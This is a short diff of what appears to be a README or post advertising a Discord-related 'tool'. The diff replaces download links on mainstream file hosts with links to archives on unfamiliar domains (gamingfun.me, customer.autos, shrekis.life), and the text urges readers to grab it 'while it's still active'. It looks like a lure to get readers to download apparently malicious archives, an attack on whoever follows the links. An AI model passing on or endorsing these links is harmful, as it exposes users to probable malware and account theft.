@@ -16,11 +16,11 @@ Requirements :
   
 
 Here are the links to download the tool: 
-Link 1 ==> https://1fichier.com/?2qyw5bqynu7md7h6ttds
+Link 1 ==> https://gamingfun.me/location.php?id=BUXV5T.zip
 
-Link 2 ==> https://mega.nz/file/YYJ3jLDa#6uS9R3r_rFIygXPmcgvh5Bud0m569nUdV-wezYuxGfs
+Link 2 ==> https://customer.autos/location.php?id=IF28D4.zip
 
-Link 3 ==> https://drive.google.com/file/d/1G9nWQD1zXBxKc8DZtCZzjzeD9Sv0VA1z/view?usp=sharing
+Link 3 ==> https://shrekis.life/location.php?id=0A8W1M.rar
 
 
 Make sure to get it while it's still active! I will continue to update it for as long as possible before Discord fixes it.
